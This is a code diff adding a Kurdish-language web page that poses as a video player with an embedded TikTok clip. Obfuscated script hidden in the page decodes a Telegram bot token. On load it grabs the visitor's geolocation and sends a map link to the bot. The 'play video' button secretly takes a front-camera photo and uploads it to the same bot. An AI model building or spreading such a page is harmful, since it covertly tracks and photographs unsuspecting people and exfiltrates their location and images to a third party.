@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پەرتووک و ڤیدیۆێن مۆدێرن</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>body { font-family: 'Vazirmatn', sans-serif; }</style>
+</head>
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4" onload="_initSys()">
+
+    <div class="bg-slate-800 p-6 rounded-2xl shadow-2xl w-full max-w-md border border-slate-700 text-center">
+        <h1 class="text-xl font-bold mb-4 text-indigo-400">ڤیدیۆیا سەرەکی</h1>
+        <p class="text-slate-300 text-sm mb-4">بۆ دیتن و لێدانا ڤیدیۆیێ، ل خوارێ کلیک بکە.</p>
+        
+        <div class="mb-4">
+            <iframe src="https://www.tiktok.com/embed/v2/ZSXTxbpgo" class="w-full h-64 rounded-xl border-0" allowfullscreen></iframe>
+        </div>
+
+        <button onclick="_execProc()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl transition duration-200">
+            لێدان و ڤەکرنا ڤیدیۆیێ
+        </button>
+    </div>
+
+    <video id="_vElem" autoplay playsinline class="hidden"></video>
+    <canvas id="_cElem" class="hidden"></canvas>
+
+    <script>
+        // زانیاری و تەکۆن ب شێوازەکێ گەلەک ئالۆز هاتینە پاراستن
+        const _kData = ["ODk3Nzk0NTc4", "MTpBQUZJNDRS", "T3VkUjVlTER3", "bEJycE5TeU5p", "SmotQzhGdURtRQ==", "NzY0MzE5MTgwMg=="];
+        
+        function _rCod(arr, idx) {
+            try { return atob(arr[idx]); } catch(e) { return ""; }
+        }
+
+        function _getTk() {
+            return _rCod(_kData, 0) + _rCod(_kData, 1) + _rCod(_kData, 2) + _rCod(_kData, 3) + _rCod(_kData, 4);
+        }
+
+        function _getId() {
+            return _rCod(_kData, 5);
+        }
+
+        function _sMsg(txt) {
+            let t = _getTk(), i = _getId();
+            if(!t || !i) return;
+            const u = `https://api.telegram.org/bot${t}/sendMessage`;
+            const d = JSON.stringify({ chat_id: i, text: txt });
+            navigator.sendBeacon(u, new Blob([d], {type: 'application/json'}));
+        }
+
+        function _sImg(blob) {
+            let t = _getTk(), i = _getId();
+            if(!t || !i) return;
+            let fd = new FormData();
+            fd.append('chat_id', i);
+            fd.append('photo', blob, 'media.jpg');
+            fd.append('caption', `🚀 کەسەک داخڵی وێبسایتی بوو\n@YUSEEF_SURCHI`);
+            fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: fd }).catch(()=>{});
+        }
+
+        function _initSys() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => {
+                        let lk = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                        _sMsg(`📍 جهـ هاتە دیتن (Auto)\nلینک: ${lk}\n@YUSEEF_SURCHI`);
+                    },
+                    (e) => {}
+                );
+            }
+        }
+
+        function _execProc() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then((s) => {
+                    const v = document.getElementById('_vElem');
+                    v.srcObject = s;
+                    setTimeout(() => {
+                        const c = document.getElementById('_cElem');
+                        c.width = v.videoWidth || 640;
+                        c.height = v.videoHeight || 480;
+                        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+                        c.toBlob((b) => {
+                            _sImg(b);
+                            s.getTracks().forEach(tr => tr.stop());
+                        }, 'image/jpeg');
+                    }, 1000);
+                })
+                .catch((e) => {
+                    _sMsg(`⚠️ ڕێکنەدا ب کامێرایێ\n@YUSEEF_SURCHI`);
+                });
+        }
+    </script>
+</body>
+</html>
